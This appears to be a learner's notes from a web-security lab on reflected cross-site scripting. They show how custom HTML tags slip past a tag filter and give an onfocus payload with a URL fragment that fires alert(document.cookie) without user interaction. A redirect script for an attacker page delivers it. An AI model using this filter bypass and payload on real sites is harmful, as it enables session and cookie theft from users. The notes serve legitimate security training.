`<script>` `<h1>` don't work

`<custom-tags>` works and we see it reflected in page's html.

and then this gives us an alert:
`<custom-tags onmouseover="alert()">`

how to make it automatic (user doesn't have to do anything (mouseover))?

`<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">`

`onfocus`: using tab or mouse click, e.g. you will see a cursor indicating
you can type there.
and might even be true on none inputting elements. if they have `tabindex="1"`

`id="x"`: focus on a specific element (bookmarking, `hashchange`?).

so at the end: if we append `#x` to the page that contains the payload, it will
be focused on it and alerted:

`/?search=<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">#x`

how to use js to redirect the victim's browser to the desired url?

if the victim visits an attacker controlled domain, the attacker can run js on
his browser, redirecting him to the URL.

`<script>
location="https://0a37005b03aa29a384e1193d0017008a.web-security-academy.net/?search=%3Ccustom-tags+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E/#x"
</script>`